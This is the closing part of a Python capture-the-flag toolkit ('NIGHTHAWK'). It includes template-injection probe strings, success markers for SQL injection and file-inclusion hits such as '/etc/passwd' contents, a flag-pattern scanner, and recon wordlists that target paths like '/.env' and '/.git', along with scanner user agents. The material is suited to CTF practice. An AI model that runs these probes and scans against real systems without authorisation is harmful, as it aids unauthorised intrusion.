            "Pug": "#{7*7}",
            "Smarty": "{7*7}",
            "Freemarker": "${7*7}",
            "Velocity": "#set($x=7*7)${x}",
            "Thymeleaf": "[[${7*7}]]",
        }

    def analyze_response(self, body, payload_type):
        indicators = {
            "sqli": {
                "errors": ["mysql", "syntax error", "ORA-", "PostgreSQL",
                           "sqlite", "ODBC", "unclosed quotation"],
                "success": ["admin", "root", "password", "flag"],
            },
            "xss": {"reflected": True},
            "ssti": {"computed_values": ["49", "7777777"]},
            "lfi": {"success_markers": ["root:x:", "daemon:", "/bin/bash", "/bin/sh"]},
        }
        return indicators.get(payload_type, {})

    def get_payloads(self, category):
        return self.PAYLOADS.get(category, [])

    def url_encode_payload(self, payload):
        import urllib.parse
        return urllib.parse.quote(payload)

    def double_url_encode(self, payload):
        import urllib.parse
        return urllib.parse.quote(urllib.parse.quote(payload))


# ============================================================
# MODULE 6: FLAG EXTRACTOR
# ============================================================

class FlagExtractor:

    PATTERNS = {
        "standard": r"FLAG\{[a-zA-Z0-9_\-]+\}",
        "ctf": r"CTF\{[a-zA-Z0-9_\-]+\}",
        "htb": r"HTB\{[a-zA-Z0-9_\-]+\}",
        "thm": r"THM\{[a-zA-Z0-9_\-]+\}",
        "picoctf": r"picoCTF\{[a-zA-Z0-9_\-]+\}",
        "flag_lower": r"flag\{[a-zA-Z0-9_\-]+\}",
        "rootme": r"RM\{[a-zA-Z0-9_\-]+\}",
        "custom_hex": r"[Ff][Ll1][Aa@][Gg9]\{[a-fA-F0-9]+\}",
        "base64_flag": r"[A-Za-z0-9+/]{20,}={0,2}",
    }

    def __init__(self):
        self.found_flags = []

    def scan_string(self, text):
        flags = []
        for name, pattern in self.PATTERNS.items():
            for match in re.finditer(pattern, text):
                flags.append({
                    "pattern": name,
                    "flag": match.group(),
                    "position": match.start(),
                    "length": len(match.group()),
                })
        self.found_flags.extend(flags)
        return flags

    def scan_file(self, filepath):
        if not os.path.isfile(filepath):
            return []
        try:
            with open(filepath, "r", errors="replace") as f:
                content = f.read()
            return self.scan_string(content)
        except Exception:
            return []

    def scan_directory(self, directory, recursive=True):
        flags = {}
        path = Path(directory)
        glob_pattern = "**/*" if recursive else "*"
        for filepath in path.glob(glob_pattern):
            if filepath.is_file() and filepath.stat().st_size < 10 * 1024 * 1024:
                found = self.scan_file(str(filepath))
                if found:
                    flags[str(filepath)] = found
        return flags

    def scan_binary(self, filepath):
        bt = BinaryToolkit()
        strings = bt.find_strings(filepath, min_length=4)
        flags = []
        for s in strings:
            found = self.scan_string(s["string"])
            if found:
                for f in found:
                    f["binary_offset"] = s["offset"]
                flags.extend(found)
        return flags

    def get_all_flags(self):
        unique = {}
        for f in self.found_flags:
            unique[f["flag"]] = f
        return list(unique.values())


# ============================================================
# MODULE 7: RECON TOOLKIT
# ============================================================

class ReconToolkit:

    COMMON_DIRS = [
        "/admin", "/login", "/dashboard", "/api", "/uploads", "/backup",
        "/config", "/debug", "/test", "/dev", "/staging", "/old",
        "/wp-admin", "/wp-content", "/wp-includes", "/wp-login.php",
        "/.git", "/.env", "/.htaccess", "/.svn", "/robots.txt",
        "/sitemap.xml", "/server-status", "/server-info",
        "/phpmyadmin", "/phpinfo.php", "/info.php",
        "/cgi-bin", "/shell", "/cmd", "/console",
        "/.DS_Store", "/web.config", "/crossdomain.xml",
    ]

    COMMON_SUBDOMAINS = [
        "www", "mail", "ftp", "admin", "api", "dev", "staging",
        "test", "blog", "shop", "vpn", "remote", "git", "jenkins",
        "ci", "cd", "monitor", "grafana", "kibana", "elastic",
        "db", "mysql", "postgres", "redis", "mongo", "mq",
        "cdn", "static", "assets", "media", "img", "images",
        "ns1", "ns2", "mx", "smtp", "pop", "imap",
    ]

    def directory_wordlist(self, base_url):
        targets = []
        base = base_url.rstrip("/")
        for path in self.COMMON_DIRS:
            targets.append({
                "url": f"{base}{path}",
                "path": path,
                "status": "pending",
            })
        return targets

    def subdomain_wordlist(self, domain):
        targets = []
        for sub in self.COMMON_SUBDOMAINS:
            targets.append({
                "subdomain": f"{sub}.{domain}",
                "status": "pending",
                "ip": None,
            })
        return targets

    def parse_robots_txt(self, content):
        rules = {"disallow": [], "allow": [], "sitemaps": []}
        for line in content.split("\n"):
            line = line.strip()
            if line.lower().startswith("disallow:"):
                rules["disallow"].append(line.split(":", 1)[1].strip())
            elif line.lower().startswith("allow:"):
                rules["allow"].append(line.split(":", 1)[1].strip())
            elif line.lower().startswith("sitemap:"):
                rules["sitemaps"].append(line.split(":", 1)[1].strip())
        return rules

    def generate_user_agents(self):
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101",
            "curl/7.88.1",
            "Wget/1.21.3",
            "python-requests/2.31.0",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "sqlmap/1.7.10",
            "Nikto/2.5.0",
        ]

    def whois_fields(self, domain):
        return {
            "domain": domain,
            "registrar": "unknown",
            "creation_date": "unknown",
            "expiration_date": "unknown",
            "nameservers": [],
            "status": "pending",
        }


# ============================================================
# MAIN — CTF FRAMEWORK INIT
# ============================================================

START_TIME = time.time()


def nighthawk_log(msg):
    if CONFIG["verbose"]:
        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"\033[35m[NIGHTHAWK {ts}]\033[0m {msg}", file=sys.stderr)


def banner():
    nighthawk_log("╔══════════════════════════════════════╗")
    nighthawk_log(f"║  PHANTOM SHELL X — NIGHTHAWK v{VERSION}  ║")
    nighthawk_log("╚══════════════════════════════════════╝")


def init_modules():
    nighthawk_log("Initializing all modules...")

    modules = {
        "crypto": CryptoSolver(),
        "network": NetworkAnalyzer(),
        "binary": BinaryToolkit(),
        "forensics": ForensicsEngine(),
        "web": WebExploitScanner(),
        "flags": FlagExtractor(),
        "recon": ReconToolkit(),
    }

    nighthawk_log("[+] Module 1: Crypto Solver        ... loaded")
    nighthawk_log("[+] Module 2: Network Analyzer     ... loaded")
    nighthawk_log("[+] Module 3: Binary Toolkit (PWN)  ... loaded")
    nighthawk_log("[+] Module 4: Forensics Engine      ... loaded")
    nighthawk_log("[+] Module 5: Web Exploit Scanner   ... loaded")
    nighthawk_log("[+] Module 6: Flag Extractor        ... loaded")
    nighthawk_log("[+] Module 7: Recon Toolkit         ... loaded")
    nighthawk_log("")
    nighthawk_log("All systems operational. Awaiting target data.")
    nighthawk_log(f"Session ID: {os.urandom(8).hex()}")
    nighthawk_log(f"Runtime: Python {sys.version.split()[0]} on {sys.platform}")
    nighthawk_log("")
    nighthawk_log("Usage: Import modules or run standalone.")
    nighthawk_log("       Each module exposes methods for automated solving.")
    nighthawk_log("")
    nighthawk_log('"If the flag exists, NIGHTHAWK will find it."')

    return modules


if __name__ == "__main__":
    banner()
    modules = init_modules()
    
    
    
    
# ============================================================
# CTF 2026 TEAM:  RM -F*
# ============================================================


#Flag | Nom du challenge


